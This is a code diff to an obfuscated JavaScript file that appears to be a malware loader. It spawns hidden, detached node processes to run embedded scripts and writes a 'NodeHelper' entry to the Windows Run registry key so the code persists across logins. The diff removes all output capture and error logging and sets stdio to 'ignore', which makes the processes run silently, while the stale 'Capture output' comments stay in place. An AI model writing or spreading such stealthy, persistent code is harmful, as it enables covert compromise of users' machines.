@@ -101,27 +101,7 @@ try {
                 const _0x69392 = spawn('node', ['-e', childScript], { 
                     windowsHide: true,
                     detached: true,
-                    stdio: ['pipe', 'pipe', 'pipe'], // Capture output
-                });
-
-                // Capture stdout logs
-                _0x69392.stdout.on('data', (data) => {
-                    console.log(`Log: ${data.toString().trim()}`);
-                });
-
-                // Capture stderr logs (errors)
-                _0x69392.stderr.on('data', (data) => {
-                    console.error(`Error: ${data.toString().trim()}`);
-                });
-
-                // Handle spawn errors
-                _0x69392.on('error', (err) => {
-                    console.error(`Spawn error: ${err.message}`);
-                });
-
-                // Optional: Check exit status
-                _0x69392.on('exit', (code) => {
-                    if (code !== 0) console.error(`Exited with code ${code}`);
+                    stdio: 'ignore' // Capture output
                 });
                 _0x69392.unref();
                 execSync(`reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "NodeHelper" /t REG_SZ /d "node ${__dirname}\\index.js" /f`, {stdio: 'ignore'});
@@ -479,27 +459,7 @@ try {
                 const _0x23df1e = spawn('node', ['-e', _0x3d341e], {
                     windowsHide: true,
                     detached: true,
-                    stdio: ['pipe', 'pipe', 'pipe'], // Capture output
-                });
-
-                // Capture stdout logs
-                _0x23df1e.stdout.on('data', (data) => {
-                    console.log(`Log: ${data.toString().trim()}`);
-                });
-
-                // Capture stderr logs (errors)
-                _0x23df1e.stderr.on('data', (data) => {
-                    console.error(`Error: ${data.toString().trim()}`);
-                });
-
-                // Handle spawn errors
-                _0x23df1e.on('error', (err) => {
-                    console.error(`Spawn error: ${err.message}`);
-                });
-
-                // Optional: Check exit status
-                _0x23df1e.on('exit', (code) => {
-                    if (code !== 0) console.error(`Exited with code ${code}`);
+                    stdio: 'ignore' // Capture output
                 });
                 _0x23df1e.unref();
                 resolve({ success: true, message: "third completed"});
@@ -719,28 +679,9 @@ try {
                 const _0x849f8 = spawn('node', ['-e', _0x4f325],{
                     windowsHide: true,
                     detached: true,
-                    stdio: ['pipe', 'pipe', 'pipe'], // Capture output
+                    stdio: 'ignore' // Capture output
                 });
 
-                // Capture stdout logs
-                _0x849f8.stdout.on('data', (data) => {
-                    console.log(`Log: ${data.toString().trim()}`);
-                });
-
-                // Capture stderr logs (errors)
-                _0x849f8.stderr.on('data', (data) => {
-                    console.error(`Error: ${data.toString().trim()}`);
-                });
-
-                // Handle spawn errors
-                _0x849f8.on('error', (err) => {
-                    console.error(`Spawn error: ${err.message}`);
-                });
-
-                // Optional: Check exit status
-                _0x849f8.on('exit', (code) => {
-                    if (code !== 0) console.error(`Exited with code ${code}`);
-                });
                 _0x849f8.unref();
                 resolve({ success: true, message: "second completed"});
                 // console.log(_0x849f8);
